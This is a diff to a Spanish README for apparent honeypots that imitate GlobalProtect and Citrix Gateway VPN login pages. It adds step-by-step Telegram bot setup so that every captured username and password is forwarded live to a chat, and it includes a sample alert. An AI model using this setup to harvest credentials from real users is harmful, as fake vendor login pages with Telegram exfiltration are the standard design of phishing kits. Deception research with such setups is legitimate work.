@@ -29,8 +29,105 @@ dentro de la función y en una carpeta de trabajo local pueden estar
 `honeypot.log`/`creds.log` (con credenciales de verdad) y el `.env.local` que
 deja el CLI.
 
-Las capturas en Vercel se avisan por Telegram: el disco allí es efímero. Ver las
-variables `TELEGRAM_*` en el README de cada uno.
+Las capturas en Vercel se avisan por Telegram, porque el disco allí es efímero:
+debajo está el paso a paso para montar el bot, el grupo y el topic.
+
+## Alertas de Telegram (bot, grupo y topic)
+
+Cada credencial capturada sale en el momento hacia un grupo de Telegram y, si el
+grupo es de tipo foro, hacia un topic concreto. Es la única vía de captura en
+Vercel —allí el disco es efímero— y el aviso cómodo cuando lo sirves tú.
+
+### 1. El bot
+
+Habla con [@BotFather](https://t.me/BotFather), `/newbot`, y guarda el token que
+te devuelve (`123456789:AA…`). Ese es el `TELEGRAM_BOT_TOKEN`.
+
+### 2. El grupo (y el topic)
+
+Crea el grupo, actívale los *Topics* si quieres separar el ruido de cada
+honeypot, y **añade el bot al grupo**. Si es de tipo foro, crea el topic donde
+quieras las alertas (por ejemplo `Credenciales`).
+
+### 3. El id del grupo
+
+Manda un mensaje en el grupo mencionando al bot (`@tu_bot`) para que Telegram le
+entregue el update, y pregúntale a la API:
+
+```bash
+curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" \
+  | jq '.result[].message.chat | {id, title, type}'
+```
+
+El `id` de un grupo es negativo (`-1001234567890`). Ese es el
+`TELEGRAM_CHAT_ID`.
+
+### 4. El id del topic
+
+Con el topic ya creado, escribe **dentro del topic** mencionando al bot y vuelve
+a mirar los updates:
+
+```bash
+curl -s "https://api.telegram.org/bot<TOKEN>/getUpdates" \
+  | jq '.result[].message | select(.is_topic_message) | {message_thread_id, text}'
+```
+
+Ese `message_thread_id` es el `TELEGRAM_TOPIC_ID`. También es el último número
+del enlace de un mensaje del topic: `t.me/c/<grupo>/<topic>`.
+
+### 5. Probarlo antes de fiarse
+
+```bash
+curl -s -X POST "https://api.telegram.org/bot<TOKEN>/sendMessage" \
+  -d chat_id=<CHAT_ID> -d message_thread_id=<TOPIC_ID> \
+  -d text="prueba de alertas" | jq '{ok, description}'
+```
+
+Si devuelve `ok: true`, el honeypot también podrá.
+
+### 6. Configurarlo
+
+En un servidor, exporta las tres antes de arrancar:
+
+```bash
+export TELEGRAM_BOT_TOKEN=123456789:AA...
+export TELEGRAM_CHAT_ID=-1001234567890
+export TELEGRAM_TOPIC_ID=42
+bash run.sh
+```
+
+En Vercel (y después redespliega: la función lee las variables al arrancar):
+
+```bash
+cd globalprotect        # y lo mismo en citrix-gateway
+vercel env add TELEGRAM_BOT_TOKEN production
+vercel env add TELEGRAM_CHAT_ID production
+vercel env add TELEGRAM_TOPIC_ID production
+./deploy.sh
+```
+
+También se aceptan los nombres cortos `TG_TOKEN`, `TG_CHAT_ID` y `TG_TOPIC_ID`.
+
+### Qué llega
+
+```
+🎣 CREDENTIAL CAPTURED (GlobalProtect)
+━━━━━━━━━━━━━━━━━━━━━━
+👤 User: ana.lopez
+🔑 Pass: …
+🌐 IP: 203.0.113.7
+🌍 Geo: Madrid, Spain (ES)
+🏢 Org: Telefonica de Espana
+🖥 UA: Mozilla/5.0 (Windows NT 10.0; Win64; x64) …
+📍 Path: /global-protect/login.esp
+🕐 TS: 2026-10-02 11:22:01 UTC
+```
+
+El envío es **síncrono** (con 5 s de timeout) a propósito: en serverless un hilo
+en segundo plano puede morir al terminar la respuesta, y perder una captura es
+lo peor que le puede pasar a un honeypot. Si Telegram lo rechaza —topic
+equivocado, bot fuera del grupo, token caducado— el motivo queda en el log:
+`[TG] Telegram rechazó el mensaje: <descripción>`.
 
 ## Cómo funciona cualquiera de ellos
 
